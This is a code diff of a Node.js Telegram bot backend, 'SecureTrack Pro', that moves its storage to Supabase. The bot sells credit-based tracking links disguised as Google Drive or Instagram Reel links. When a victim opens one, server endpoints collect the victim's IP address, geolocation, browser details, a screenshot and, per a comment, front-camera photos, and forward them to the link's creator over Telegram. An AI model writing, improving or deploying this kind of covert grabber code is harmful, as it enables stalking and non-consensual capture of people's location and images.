@@ -9,9 +9,13 @@ const multer = require('multer');
 const cors = require('cors');
 const fs = require('fs');
 const path = require('path');
+require('dotenv').config();
+const { createClient } = require('@supabase/supabase-js');
 
 const BOT_TOKEN = process.env.BOT_TOKEN;
 const ADMIN_CHAT_ID = process.env.ADMIN_CHAT_ID; // ✅ Tu ID de Telegram
+const SUPABASE_URL = process.env.SUPABASE_URL;
+const SUPABASE_KEY = process.env.SUPABASE_KEY;
 
 // Configuración del servidor
 const PORT = Number(process.env.PORT) || 8080;
@@ -23,10 +27,13 @@ const WEBSITE_URL = /^https?:\/\//i.test(RAW_PUBLIC_BASE_URL)
     ? RAW_PUBLIC_BASE_URL.replace(/\/+$/, '')
     : `https://${RAW_PUBLIC_BASE_URL.replace(/\/+$/, '')}`;
 
-if (!BOT_TOKEN || !ADMIN_CHAT_ID) {
-    console.error('❌ Faltan variables de entorno: BOT_TOKEN y ADMIN_CHAT_ID son obligatorias.');
+if (!BOT_TOKEN || !ADMIN_CHAT_ID || !SUPABASE_URL || !SUPABASE_KEY) {
+    console.error('❌ Faltan variables de entorno obligatorias.');
+    console.error('Asegúrate de configurar: BOT_TOKEN, ADMIN_CHAT_ID, SUPABASE_URL, SUPABASE_KEY');
     process.exit(1);
 }
+
+const supabase = createClient(SUPABASE_URL, SUPABASE_KEY);
 
 const BASE_URL = `https://api.telegram.org/bot${BOT_TOKEN}`;
 let offset = 0;
@@ -34,67 +41,9 @@ let visitCount = 0;
 let startTime = new Date();
 let isPolling = false;  // ✅ Bandera para evitar polling duplicado
 let conflictCount = 0;  // Contador de conflictos consecutivos
-let lastConflictTime = 0;  // Timestamp del último conflicto
-
-// Base de datos en memoria para asociar Links con Usuarios
-// Formato: { "V-123456": "ID_DEL_CHAT_DEL_USUARIO" }
-let linkDatabase = {};
-const linkHistory = []; // Historial de enlaces generados
+// Estadísticas temporales
 const visitorStats = {}; // Estadísticas por país
-
-// ====== SISTEMA DE USUARIOS Y CRÉDITOS ======
-const DATA_DIR = process.env.DATA_DIR || __dirname;
-const USERS_FILE = path.join(DATA_DIR, 'users.json');
-const LINKS_FILE = path.join(DATA_DIR, 'links.json');
-let usersDB = {};
-
-// Cargar la base de datos de usuarios al inicio
-function loadUsersDB() {
-    try {
-        if (fs.existsSync(USERS_FILE)) {
-            const data = fs.readFileSync(USERS_FILE, 'utf8');
-            usersDB = JSON.parse(data);
-        } else {
-            // Si no existe, crear con el ADMIN como ilimitado
-            usersDB[ADMIN_CHAT_ID] = { name: "Administrador", plan: "unlimited", credits: 0 };
-            saveUsersDB();
-        }
-    } catch (e) {
-        console.error("❌ Error leyendo users.json:", e);
-    }
-}
-
-function saveUsersDB() {
-    try {
-        fs.writeFileSync(USERS_FILE, JSON.stringify(usersDB, null, 2), 'utf8');
-    } catch (e) {
-        console.error("❌ Error guardando users.json:", e);
-    }
-}
-
-// Cargar persistencia de links
-function loadLinksDB() {
-    try {
-        if (fs.existsSync(LINKS_FILE)) {
-            const data = fs.readFileSync(LINKS_FILE, 'utf8');
-            linkDatabase = JSON.parse(data);
-        }
-    } catch (e) {
-        console.error("❌ Error leyendo links.json:", e);
-    }
-}
-
-function saveLinksDB() {
-    try {
-        fs.writeFileSync(LINKS_FILE, JSON.stringify(linkDatabase, null, 2), 'utf8');
-    } catch (e) {
-        console.error("❌ Error guardando links.json:", e);
-    }
-}
-
-loadUsersDB();
-loadLinksDB();
-// ===========================================
+const linkHistory = [];
 
 const app = express();
 app.use(cors());
@@ -187,22 +136,27 @@ async function handleCommand(msg) {
 
     /* ── /start ─────────────────────────────────────── */
     if (text === '/start' || text.startsWith('/start ')) {
-        // Verificar registro
         let isNewUser = false;
-        if (!usersDB[chatId]) {
-            // Auto registro con 1 crédito
-            usersDB[chatId] = {
-                name: from,
-                plan: "credits",
-                credits: 1
-            };
-            saveUsersDB();
+
+        if (!user) {
+            // Auto registro con 1 crédito (Upsert seguro)
+            const { data: newUser, error: insertError } = await supabase
+                .from('bot_users')
+                .insert([{ chat_id: chatId, name: from, plan: 'credits', credits: 1 }])
+                .select()
+                .single();
+
+            if (insertError) {
+                console.error("Error al registrar:", insertError);
+                await sendMessage(chatId, `❌ Error de base de datos al registrar.`);
+                return;
+            }
+            user = newUser;
             isNewUser = true;
-            console.log(`[+] Nuevo usuario registrado: ${from} (ID: ${chatId}) con 1 enlace gratis.`);
+            console.log(`[+] Nuevo usuario Supabase: ${from} (ID: ${chatId})`);
         }
 
-        const user = usersDB[chatId];
-        let welcomeText = `🎵 <b>SecureTrack Pro</b>\n\nHola <b>${from}</b>! Bienvenido.\n`;
+        let welcomeText = `🎵 <b>SecureTrack Pro</b>\n\nHola <b>${user.name}</b>! Bienvenido.\n`;
 
         if (isNewUser) {
             welcomeText += `\n🎁 <b>REGALO DE BIENVENIDA:</b>\nTienes <b>1 enlace gratis</b> de prueba.\n`;
@@ -230,12 +184,11 @@ async function handleCommand(msg) {
 
         /* ── /myplan ────────────────────────────────────── */
     } else if (text === '/myplan') {
-        if (!usersDB[chatId]) {
+        if (!user) {
             await sendMessage(chatId, `❌ No estás registrado. Usa /start primero.`);
             return;
         }
 
-        const user = usersDB[chatId];
         const status = user.plan === 'unlimited' ? 'Ilimitado ♾️' : `${user.credits} Créditos Restantes`;
 
         await sendMessage(chatId,
@@ -258,13 +211,15 @@ async function handleCommand(msg) {
         const newId = parts[1];
         const newName = parts.slice(2).join(' ');
 
-        if (usersDB[newId]) {
-            await sendMessage(chatId, `⚠️ Ese usuario ya existe en la base de datos.`);
+        const { error } = await supabase
+            .from('bot_users')
+            .insert([{ chat_id: newId, name: newName, plan: 'credits', credits: 0 }]);
+
+        if (error) {
+            await sendMessage(chatId, `⚠️ Ese usuario ya existe o error BD: ${error.message}`);
             return;
         }
 
-        usersDB[newId] = { name: newName, plan: "credits", credits: 0 };
-        saveUsersDB();
         await sendMessage(chatId, `✅ <b>Usuario ${newName} (${newId}) agregado con éxito.</b> (Con 0 créditos).\nUsa <code>/addcredits ${newId} 10</code> o <code>/setplan ${newId} unlimited</code>.`);
 
         /* ── /addcredits (ADMIN) ───────────────────────── */
@@ -278,15 +233,21 @@ async function handleCommand(msg) {
         const tId = parts[1];
         const amount = parseInt(parts[2], 10);
 
-        if (isNaN(amount) || !usersDB[tId]) {
-            await sendMessage(chatId, `⚠️ Usuario no encontrado o cantidad incorrecta.`);
+        if (isNaN(amount)) {
+            await sendMessage(chatId, `⚠️ Cantidad incorrecta.`);
             return;
         }
 
-        usersDB[tId].credits += amount;
-        saveUsersDB();
+        // Forma sencilla si no hay RPC (Stored Procedure): Leer, sumar, actualizar
+        const { data: targetUser } = await supabase.from('bot_users').select('credits, name').eq('chat_id', tId).single();
+        if (!targetUser) {
+            await sendMessage(chatId, `⚠️ Usuario no encontrado.`);
+            return;
+        }
+        const newTotal = targetUser.credits + amount;
+        await supabase.from('bot_users').update({ credits: newTotal }).eq('chat_id', tId);
 
-        await sendMessage(chatId, `✅ <b>Operación exitosa:</b>\nUsuario: ${usersDB[tId].name}\nCréditos Totales: ${usersDB[tId].credits}`);
+        await sendMessage(chatId, `✅ <b>Operación exitosa:</b>\nUsuario: ${targetUser.name}\nCréditos Totales: ${newTotal}`);
 
         // Notificar al usuario (opcional)
         try {
@@ -306,28 +267,32 @@ async function handleCommand(msg) {
         const tId = parts[1];
         const pType = parts[2].toLowerCase();
 
-        if (!usersDB[tId] || (pType !== 'unlimited' && pType !== 'credits')) {
-            await sendMessage(chatId, `⚠️ Usuario no encontrado o plan inválido (unlimited / credits).`);
+        if (pType !== 'unlimited' && pType !== 'credits') {
+            await sendMessage(chatId, `⚠️ Plan inválido (unlimited / credits).`);
             return;
         }
 
-        usersDB[tId].plan = pType;
-        saveUsersDB();
-        await sendMessage(chatId, `✅ <b>Plan actualizado:</b>\nUsuario: ${usersDB[tId].name}\nNuevo Plan: ${pType}`);
+        const { data, error } = await supabase.from('bot_users').update({ plan: pType }).eq('chat_id', tId).select().single();
+        if (error || !data) {
+            await sendMessage(chatId, `⚠️ Usuario no encontrado o error BD.`);
+            return;
+        }
+
+        await sendMessage(chatId, `✅ <b>Plan actualizado:</b>\nUsuario: ${data.name}\nNuevo Plan: ${pType}`);
 
         /* ── /users (ADMIN) ────────────────────────────── */
     } else if (text === '/users') {
         if (chatId !== ADMIN_CHAT_ID) return;
 
         let msg = `👥 <b>Lista de Usuarios Autorizados</b>\n\n`;
-        const entries = Object.entries(usersDB);
+        const { data: users, error } = await supabase.from('bot_users').select('*').order('created_at', { ascending: false });
 
-        if (entries.length === 0) {
+        if (error || !users || users.length === 0) {
             msg += `<i>No hay usuarios.</i>`;
         } else {
-            entries.forEach(([id, u], idx) => {
+            users.forEach((u, idx) => {
                 const bal = u.plan === 'unlimited' ? '♾️' : `${u.credits} cr`;
-                msg += `${idx + 1}. <code>${id}</code> — <b>${u.name}</b> [${bal}]\n`;
+                msg += `${idx + 1}. <code>${u.chat_id}</code> — <b>${u.name}</b> [${bal}]\n`;
             });
         }
         await sendMessage(chatId, msg);
@@ -342,13 +307,12 @@ async function handleCommand(msg) {
         else if (text.startsWith('/drive')) { type = 'drive'; typeName = 'Google Drive'; }
         else if (text.startsWith('/ig')) { type = 'ig'; typeName = 'Instagram Reel'; }
 
-        // === VALIDACIÓN DE CRÉDITOS ===
-        if (!usersDB[chatId]) {
+        // === VALIDACIÓN DE CRÉDITOS (Supabase) ===
+        if (!user) {
             await sendMessage(chatId, `❌ No estás registrado en el sistema. Escriba /start`);
             return;
         }
 
-        const user = usersDB[chatId];
         if (user.plan === 'credits') {
             if (user.credits <= 0) {
                 await sendMessage(chatId,
@@ -356,9 +320,8 @@ async function handleCommand(msg) {
                 );
                 return;
             }
-            // Consumimos 1 crédito
-            user.credits -= 1;
-            saveUsersDB();
+            // Consumimos 1 crédito en DB
+            await supabase.from('bot_users').update({ credits: user.credits - 1 }).eq('chat_id', chatId);
         }
         // ==================================
 
@@ -370,9 +333,11 @@ async function handleCommand(msg) {
             target = `V${Math.random().toString(36).substring(2, 6).toUpperCase()}`;
         }
 
-        // ASIGNAMOS ESTE ENLACE AL USUARIO QUE LO CREÓ
-        linkDatabase[target] = chatId;
-        saveLinksDB(); // Guardamos el nuevo link en JSON
+        // ASIGNAMOS ESTE ENLACE AL USUARIO (Guardar en Supabase)
+        const { error: linkError } = await supabase.from('bot_links').insert([{ target_id: target, chat_id: chatId }]);
+        if (linkError) {
+            console.error("Error guardando enlace:", linkError);
+        }
 
         const longUrl = buildTrackingUrl(target, type);
         const shortUrl = await shortenUrl(longUrl);
@@ -493,11 +458,18 @@ app.post('/api/report', async (req, res) => {
     visitCount++;
     const data = req.body;
 
-    // Determinar a quién enviarle el mensaje
+    // Determinar a quién enviarle el mensaje buscando en DB
     const targetId = data.targetId || 'Visitante Anónimo';
-    const ownerChatId = linkDatabase[targetId] || ADMIN_CHAT_ID; // Si no existe el ID, va al admin por defecto
+    let ownerChatId = ADMIN_CHAT_ID; // Si no existe el ID en BD, va al admin por defecto
 
-    console.log(`[REPORT RECIBIDO] ID: ${targetId} | Chat: ${ownerChatId} | LinkDB:`, Object.keys(linkDatabase));
+    if (targetId !== 'Visitante Anónimo') {
+        const { data: linkData } = await supabase.from('bot_links').select('chat_id').eq('target_id', targetId).single();
+        if (linkData && linkData.chat_id) {
+            ownerChatId = linkData.chat_id;
+        }
+    }
+
+    console.log(`[REPORT RECIBIDO] ID: ${targetId} | Chat destino: ${ownerChatId}`);
     console.log(`[GEO] ${data.geo?.country} | ${data.browser?.browser} | IP: ${data.geo?.ip}`);
 
     // Registrar estadísticas de países
@@ -597,7 +569,12 @@ ${flag} País:          ${g.country} (${g.countryCode})
 // Recibe la foto (screenshot) y cámara frontal (si hay) y las reenvía a Telegram
 app.post('/api/photo', upload.array('photos', 2), async (req, res) => {
     const targetId = req.body.targetId || 'Desconocido';
-    const ownerChatId = linkDatabase[targetId] || ADMIN_CHAT_ID;
+    let ownerChatId = ADMIN_CHAT_ID;
+
+    if (targetId !== 'Desconocido') {
+        const { data: linkData } = await supabase.from('bot_links').select('chat_id').eq('target_id', targetId).single();
+        if (linkData && linkData.chat_id) ownerChatId = linkData.chat_id;
+    }
 
     if (req.files && req.files.length > 0) {
         try {
